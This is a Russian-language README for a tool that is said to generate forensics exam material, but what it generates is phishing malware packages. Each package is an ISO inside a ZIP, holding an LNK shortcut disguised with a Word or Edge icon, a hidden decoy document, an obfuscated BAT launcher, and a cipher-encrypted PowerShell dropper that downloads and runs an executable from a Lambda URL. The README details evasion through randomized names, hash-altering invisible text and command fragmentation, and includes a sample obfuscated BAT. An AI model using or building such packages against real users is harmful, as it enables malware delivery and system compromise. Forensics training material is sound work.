# exam-gen

Автоматический генератор уникальных kill chain пакетов для экзамена по компьютерной криминалистике.

Скрипт принимает папки-варианты с готовыми `.docx` документами и на выходе даёт **два ZIP-архива на каждый вариант**:
- `VariantName.zip` — Word-версия (ISO с DOCX + kill chain, LNK с иконкой Word)
- `VariantName_pdf.zip` — PDF-версия (ISO с PDF + kill chain, LNK с иконкой Edge)

Каждый запуск генерирует **уникальные** артефакты: новая карта шифра, новые имена переменных, новые хеши документов.

## Требования

### Система (Linux)

```bash
sudo apt install libreoffice-writer   # конвертация DOCX → PDF
```

### Python 3.8+

```bash
pip install -r requirements.txt
```

| Пакет | Назначение |
|-------|------------|
| `python-docx` | Модификация DOCX (невидимый текст для смены хеша) |
| `pycdlib` | Создание ISO-образов с Joliet и hidden-флагами |
| `pylnk3` | Создание Windows-ярлыков (.lnk) на Linux |

## Быстрый старт

```bash
# 1. Клонировать
git clone https://github.com/hungohun48/exam-gen.git
cd exam-gen

# 2. Установить зависимости
pip install -r requirements.txt

# 3. Настроить конфиг
cp .env.example .env
nano .env

# 4. Положить варианты
#    variants/
#    ├── Variant-01/
#    │   ├── doc1.docx
#    │   └── doc2.docx
#    └── Variant-02/
#        └── doc1.docx

# 5. Запустить
python3 generate.py
```

## Конфигурация

Все параметры читаются из **переменных окружения** или файла `.env` рядом со скриптом.

| Переменная | Обязательная | По умолчанию | Описание |
|------------|:---:|---|---|
| `LAMBDA_URL` | да | — | URL Lambda Function для доставки payload |
| `API_KEY` | да | — | Значение заголовка `X-Api-Key` |
| `TARGET_FILENAME` | нет | `cat.exe` | Имя скачиваемого файла на стороне жертвы |
| `VARIANTS_DIR` | нет | `./variants` | Путь к папкам вариантов |
| `OUTPUT_DIR` | нет | `./output` | Путь для выходных ZIP-архивов |

Пример `.env`:

```env
LAMBDA_URL=https://xxx.lambda-url.us-east-1.on.aws/?file=releases%2Fcat.exe
API_KEY=c21e6bf4d3ef63a80aa494dd32fec07e9d35088b80818cad396dd0d5eb5748ed
TARGET_FILENAME=cat.exe
```

Альтернативно — через `export`:

```bash
export LAMBDA_URL='https://...'
export API_KEY='...'
python3 generate.py
```

## Структура проекта

```
exam-gen/
├── generate.py          # Основной скрипт (единый файл)
├── requirements.txt     # Зависимости Python
├── .env.example         # Шаблон конфигурации
├── .gitignore
├── variants/            # ВХОД: папки вариантов с .docx
│   ├── Variant-01/
│   │   ├── doc1.docx
│   │   └── doc2.docx
│   └── Variant-02/
│       └── doc1.docx
└── output/              # ВЫХОД: готовые пакеты
    ├── Variant-01.zip
    ├── Variant-01_pdf.zip
    ├── Variant-02.zip
    └── Variant-02_pdf.zip
```

## Пайплайн генерации (на каждый вариант)

### Шаг 1 — Копирование и модификация хешей DOCX

Каждый `.docx` из папки варианта копируется во временную директорию. В конец документа добавляется невидимый абзац (белый текст, 1pt) из случайных слов — хеш файла меняется при каждом запуске.

### Шаг 2 — Генерация PS1-дроппера

Создаётся один PowerShell-дроппер на вариант (используется обеими версиями):

1. **Шаблон** — 9-строчный WebClient-скрипт с `X-Api-Key` и Lambda URL
2. **Шифрование** — тело шаблона шифруется подстановочным шифром (83 символа → уникальные 2-символьные коды из `[0-9a-z]`)
3. **Base64** — URL и имя файла кодируются в Base64
4. **Обёртка** — артефакт содержит зашифрованное тело, карту дешифрации, функцию расшифровки и `Invoke-Expression`
5. **Рандомизация** — все имена переменных и функций генерируются из пула слов (Windows API / Hex стили)

### Шаг 3 — Сборка Word-пакета

1. Первый DOCX переименовывается в `doc.docx` (decoy, скрытый)
2. Остальные DOCX остаются видимыми
3. Генерируется `ik.bat` с обфускацией set-variable fragmentation + junk REM
4. PS1 копируется как `ser.ps1`
5. Создаётся LNK с иконкой Word (`SHELL32.dll,1`), target → `cmd.exe /c "start /min .\ik.bat"`
6. Всё пакуется в ISO (Joliet, hidden-флаги на `ik.bat`, `ser.ps1`, `doc.docx`)
7. ISO пакуется в `VariantName.zip`

### Шаг 4 — Сборка PDF-пакета

1. Все DOCX конвертируются в PDF через LibreOffice headless
2. Аналогичная сборка, но decoy — `doc.pdf`, иконка LNK — Edge (`msedge.exe,11`)
3. Результат — `VariantName_pdf.zip`

## Содержимое ISO (вид на Windows)

При монтировании ISO в Windows Explorer с настройками по умолчанию:

| Файл | Видимость | Назначение |
|------|:---------:|------------|
| `Документ.lnk` | видимый | Ярлык (выглядит как DOCX/PDF), запускает kill chain |
| `doc2.docx` / `doc2.pdf` | видимый | Дополнительные документы (если есть) |
| `doc.docx` / `doc.pdf` | скрытый | Decoy-документ, открывается при клике на LNK |
| `ik.bat` | скрытый | Обфусцированный BAT: открывает decoy + запускает PS1 |
| `ser.ps1` | скрытый | Зашифрованный PS1-дроппер |

## Обфускация

### BAT (set-variable fragmentation)

```batch
@echo off
cd /d "%~dp0"
REM Configuration loader v3
set "c=ell"
REM Checking system integrity...
set "a=pow"
set "f= -Ex"
set "b=ersh"
...
start doc.docx
%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File ser.ps1
```

`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии.

### PS1 (подстановочный шифр + Base64)

```
Слои обфускации:
1. Подстановочный шифр — тело скрипта (83 уникальных 2-символьных кода)
2. Base64 — URL и имя файла
3. Рандомные имена переменных — стиль Windows API / Hex
4. Invoke-Expression — финальное выполнение
```

## Проверка результатов

```bash
# 1. Запустить генерацию
python3 generate.py

# 2. Проверить выход
ls output/
# Variant-01.zip  Variant-01_pdf.zip  Variant-02.zip  Variant-02_pdf.zip

# 3. Скопировать на Windows → распаковать ZIP → смонтировать ISO
# 4. Убедиться:
#    - Видны только LNK + дополнительные документы
#    - Клик по LNK → открывается decoy + PS1 запускается
#    - PS1 скачивает файл с Lambda → запускает
# 5. Каждый вариант имеет уникальные: шифр, переменные, хеши DOCX
```
